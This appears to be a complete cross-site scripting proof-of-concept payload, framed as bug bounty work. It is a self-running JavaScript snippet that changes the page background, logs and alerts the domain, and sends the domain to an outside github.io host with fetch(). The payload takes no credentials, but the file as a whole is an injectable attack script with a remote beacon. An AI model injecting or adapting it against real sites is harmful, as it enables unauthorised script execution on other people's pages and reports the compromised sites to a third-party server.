// Bug Bounty PoC payload
(function() {
  try {
    // 1. Visual proof
    document.body.style.background = "limegreen";

    // 2. Console marker
    console.log("✅ Bug Bounty PoC XSS executed on:", document.domain);

    // 3. Alert (if browser allows it)
    alert("Bug Bounty PoC XSS: " + document.domain);

    // 4. Beacon back to your server (to confirm remotely)
    fetch("https://russianyandexshop.github.io/ytstudio-xss-poc/log?domain=" + document.domain)
      .catch(e => console.log("Beacon failed:", e));

  } catch (err) {
    console.error("Payload error:", err);
  }
})();
